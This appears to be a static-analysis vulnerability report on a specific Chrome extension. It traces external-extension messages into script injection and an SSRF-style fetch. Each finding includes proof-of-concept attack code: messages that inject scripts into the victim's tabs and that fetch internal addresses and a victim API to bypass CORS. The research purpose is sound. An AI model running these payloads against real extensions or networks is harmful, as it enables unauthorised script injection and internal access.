# CoCo Analysis: eljggejklpoajcaaglkgmifpgphpinfc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_external_port_onMessage → chrome_tabs_executeScript_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eljggejklpoajcaaglkgmifpgphpinfc/opgen_generated_files/bg.js
Line 972: chrome.tabs.executeScript(a,{file:"/scr/cd.js"},b)
Flow: chrome.runtime.onConnectExternal → message.tab → chrome.tabs.executeScript(tabId)
```

**Code:**
```javascript
// Background script (bg.js line 969-974, formatted for clarity)

// Entry point - external extension connection
chrome.runtime.onConnectExternal.addListener(function(d) {
    // Check if sender is specific whitelisted extension
    if (d.sender.id == p()) { // p() returns "lkgddfdhacphakkcolonlmpjeenkgpci" or Firefox ID

        // Message handler from external extension
        var l = function(a) { // ← a is attacker-controlled message
            switch(a.cid) {
                case "generate":
                    q(a); // Passes message to q function
                    break;
                case "url":
                    n(a.url); // Passes URL to n function (Sink 2)
            }
        };

        // Function q handles the "generate" message
        q = function(a) {
            function c(b, c = null) {
                if ("shot" == a.source) {
                    g(b, c);
                } else {
                    t(b, a.source, c); // ← calls t with attacker-controlled a.source
                }
            }

            // If message has a.tab property
            if ("undefined" != typeof a.tab) { // ← attacker-controlled tab ID
                chrome.tabs.get(a.tab, function(b) {
                    if ("undefined" != typeof b && "undefined" != typeof b.url && "undefined" != typeof b.title) {
                        if ((new URL(b.url)).protocol.match(/https?:/g)) {
                            c(a.tab); // ← passes attacker-controlled tab ID to c, then to t
                            e({cid: "tabinfo", url: b.url, title: b.title});
                        }
                    }
                });
            }
        };

        // Function t executes script in tab
        t = function(a, c, d) { // ← a is tab ID from attacker message
            function b(b) {
                if ("undefined" != typeof b) {
                    chrome.tabs.sendMessage(a, {cid: "generate", val: c, tab: d});
                } else {
                    g(a);
                }
            }

            // Execute script in attacker-specified tab
            if ("undefined" != typeof chrome.scripting) {
                chrome.scripting.executeScript({
                    target: {tabId: a}, // ← attacker-controlled tab ID
                    files: ["/scr/cd.js"]
                }, b);
            } else {
                chrome.tabs.executeScript(a, {file: "/scr/cd.js"}, b); // ← attacker-controlled tab ID
            }
        };

        d.onMessage.addListener(l);
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onConnectExternal (external extension message)

**Attack:**
```javascript
// From the whitelisted external extension (ID: lkgddfdhacphakkcolonlmpjeenkgpci)
// Attacker who controls or compromises that extension can:

var port = chrome.runtime.connect("eljggejklpoajcaaglkgmifpgphpinfc");

// Get victim's active tab ID first
chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    // Inject script into victim's tab
    port.postMessage({
        cid: "generate",
        source: "attacker", // Any value except "shot" triggers executeScript
        tab: tabs[0].id // ← Inject into victim's current tab
    });
});

// Or inject into any specific tab
port.postMessage({
    cid: "generate",
    source: "malicious",
    tab: 123 // ← Specific tab ID
});
```

**Impact:** Although limited to one specific whitelisted extension (lkgddfdhacphakkcolonlmpjeenkgpci), if that extension is compromised or malicious, it can execute arbitrary scripts (/scr/cd.js) in any tab by specifying the tab ID. Per the methodology, even if only ONE extension can exploit it, this is classified as TRUE POSITIVE. The attacker gains the ability to inject content scripts into arbitrary tabs with the extension's permissions.

---

## Sink 2: bg_external_port_onMessage → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eljggejklpoajcaaglkgmifpgphpinfc/opgen_generated_files/bg.js
Line 974: fetch(a)
Flow: chrome.runtime.onConnectExternal → message.url → fetch(url)
```

**Code:**
```javascript
// Background script (bg.js line 969-974, formatted for clarity)

chrome.runtime.onConnectExternal.addListener(function(d) {
    if (d.sender.id == p()) { // Check if sender is whitelisted extension

        var l = function(a) { // ← a is attacker-controlled message
            switch(a.cid) {
                case "url":
                    n(a.url); // ← passes attacker-controlled URL to n function
                    break;
            }
        };

        // Function n fetches from URL
        n = function(a, c = null) { // ← a is attacker-controlled URL
            if ("" != a) {
                fetch(a) // ← SSRF: fetch from attacker-controlled URL with extension privileges
                    .then(a => a.blob())
                    .then(function(a) {
                        if (a.type.match("^image/")) {
                            let b = new FileReader;
                            b.onload = a => {
                                e({cid: "generated", img: a.target.result}, c);
                            };
                            b.onerror = a => {
                                f(c);
                            };
                            setTimeout(function() {
                                b.readAsDataURL(a)
                            }, 300);
                        } else {
                            f(c);
                        }
                    });
            } else {
                f(c);
            }
        };

        d.onMessage.addListener(l);
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onConnectExternal (external extension message)

**Attack:**
```javascript
// From the whitelisted external extension (ID: lkgddfdhacphakkcolonlmpjeenkgpci)
var port = chrome.runtime.connect("eljggejklpoajcaaglkgmifpgphpinfc");

// SSRF to internal network resources
port.postMessage({
    cid: "url",
    url: "http://192.168.1.1/admin" // ← Access internal network
});

// SSRF to localhost services
port.postMessage({
    cid: "url",
    url: "http://localhost:8080/api/admin" // ← Access local services
});

// Fetch arbitrary external resources with extension privileges
port.postMessage({
    cid: "url",
    url: "https://victim-site.com/api/sensitive-data" // ← Bypass CORS
});
```

**Impact:** Although limited to one specific whitelisted extension, if that extension is compromised, the attacker can perform Server-Side Request Forgery (SSRF) attacks. The extension will fetch from attacker-controlled URLs with its elevated privileges (host_permissions for all URLs), bypassing CORS restrictions and potentially accessing internal network resources, localhost services, or making privileged requests to external sites. Per the methodology, even if only ONE extension can exploit it, this is TRUE POSITIVE.
